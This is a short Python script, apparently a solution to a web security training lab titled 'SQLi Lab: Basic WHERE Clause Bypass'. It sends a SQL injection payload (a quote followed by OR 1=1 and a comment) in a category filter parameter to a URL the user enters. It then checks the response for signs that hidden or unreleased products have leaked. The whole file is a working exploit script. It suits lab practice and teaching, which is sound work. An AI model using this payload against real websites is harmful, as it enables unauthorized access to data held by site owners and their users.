# === Standard Library ===
import sys

# === Third-Party ===
try:
    import requests
except ImportError:
    raise ImportError("Install with: pip install requests")

# === Config ===
PROXY = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}
USE_PROXY = False

def run_sqli_exploit(base_url):
    target = f"{base_url}/filter?category=Gifts'+OR+1=1--"
    headers = {
        "User-Agent": "Mozilla/5.0",
    }

    print(f"[*] Sending SQLi payload to: {target}")
    try:
        res = requests.get(target, headers=headers, proxies=PROXY if USE_PROXY else None, timeout=5)

        if res.status_code == 200:
            if "Unreleased" in res.text or "out of stock" in res.text or "View details" in res.text:
                print("[+] Likely successful SQLi — hidden/unreleased products may be visible.")
            else:
                print("[!] Request succeeded, but no hidden products clearly identified.")
        else:
            print(f"[-] Request failed — HTTP {res.status_code}")
    except Exception as e:
        print(f"[!] Error during request: {e}")

# === Main ===
if __name__ == "__main__":
    print("\n=== SQLi Lab: Basic WHERE Clause Bypass ===")
    url = input("Enter the full lab URL (e.g., https://lab-id.web-security-academy.net): ").strip().rstrip('/')
    if not url.startswith("http"):
        print("[-] Invalid URL format.")
        sys.exit(1)

    run_sqli_exploit(url)
